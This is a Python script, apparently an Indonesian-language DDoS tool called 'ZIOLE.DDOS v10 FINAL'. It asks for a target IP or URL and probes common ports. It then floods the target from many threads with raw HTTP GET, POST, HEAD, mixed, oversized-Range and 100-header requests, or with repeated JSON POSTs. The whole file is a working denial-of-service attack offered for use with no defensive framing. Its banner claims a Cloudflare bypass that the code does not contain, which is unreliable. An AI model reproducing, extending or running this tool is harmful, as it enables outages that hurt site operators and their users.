#!/usr/bin/env python3
# ZIOLE.DDOS v10 FINAL - ASCII SAFE VERSION

import requests
import threading
import time
import socket
import os
import sys
import random
import json
from urllib.parse import urlparse

RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
RESET = '\033[0m'

def print_banner():
    print(f"{CYAN}ZIOLE.DDOS v10 FINAL - BYPASS CLOUDFLARE + AUTOPORT + INLINE PAYLOAD{RESET}")

def resolve_target(target):
    if target.startswith("http"):
        parsed = urlparse(target)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        return target, host, port
    else:
        try:
            socket.inet_aton(target)
            return f"http://{target}", target, auto_detect_port(target)
        except:
            raise Exception("IP target tidak valid!")

def auto_detect_port(host):
    print(f"{CYAN}[•] Scan port umum di {host}...{RESET}")
    common_ports = [80, 443, 8080, 8443]
    for port in common_ports:
        try:
            with socket.create_connection((host, port), timeout=1):
                print(f"{GREEN}[✓] Port terbuka: {port}{RESET}")
                return port
        except:
            pass
    raise Exception("Tidak ada port terbuka dari list umum!")

def http_flood(target_url, host, port, thread_count, duration, mode="get"):
    end_time = time.time() + duration
    def attack():
        while time.time() < end_time:
            try:
                path = urlparse(target_url).path or '/'
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((host, port))
                if mode == "post":
                    payload = "username=admin&password=123456"
                    req = f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: {len(payload)}\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: close\r\n\r\n{payload}"
                elif mode == "head":
                    req = f"HEAD {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
                elif mode == "mix":
                    if random.randint(0, 1):
                        req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
                    else:
                        payload = "a=1"
                        req = f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: {len(payload)}\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: close\r\n\r\n{payload}"
                elif mode == "range":
                    req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nRange: bytes=0-999999999\r\nConnection: close\r\n\r\n"
                elif mode == "headers":
                    headers = ''.join([f"X-Fake-{i}: Ziole\r\n" for i in range(100)])
                    req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n{headers}Connection: close\r\n\r\n"
                else:
                    req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
                s.send(req.encode())
                s.close()
                print(f"{GREEN}[✓] {mode.upper()} -> {host}:{port}{RESET}")
            except Exception as e:
                print(f"{RED}[x] ERR: {e}{RESET}")
    for _ in range(thread_count):
        threading.Thread(target=attack, daemon=True).start()
    while time.time() < end_time:
        time.sleep(1)

def custom_payload_flood(url, duration, threads):
    inline_payload = {"user": "admin", "pass": "ZioleDDOS"}
    end = time.time() + duration
    def run():
        while time.time() < end:
            try:
                r = requests.post(url, json=inline_payload)
                print(f"{GREEN}[✓] CUSTOM -> {r.status_code}{RESET}")
            except: pass
    for _ in range(threads):
        threading.Thread(target=run, daemon=True).start()
    while time.time() < end:
        time.sleep(1)

if __name__ == "__main__":
    try:
        print_banner()
        target = input("Target (IP atau URL): ").strip()
        url, host, port = resolve_target(target)
        print("\nPilih mode serangan:")
        print("1) HTTP GET")
        print("2) POST")
        print("3) HEAD")
        print("4) MIX")
        print("5) RANGE")
        print("6) HEADER BOMB")
        print("7) CUSTOM JSON PAYLOAD")
        mode = input("Mode (1-7): ").strip()
        threads = int(input("Jumlah thread: "))
        duration = int(input("Durasi serangan (detik): "))

        mode_map = {
            "1": "get", "2": "post", "3": "head",
            "4": "mix", "5": "range", "6": "headers"
        }

        if mode in mode_map:
            http_flood(url, host, port, threads, duration, mode_map[mode])
        elif mode == "7":
            custom_payload_flood(url, duration, threads)
        else:
            print(f"{RED}[x] Mode tidak valid!{RESET}")

        print(f"{GREEN}\n[✓] Serangan ke {host}:{port} selesai!{RESET}")

    except KeyboardInterrupt:
        print(f"\n{RED}[x] Dibatalkan user.{RESET}")
    except Exception as e:
        print(f"{RED}[x] ERROR: {e}{RESET}")
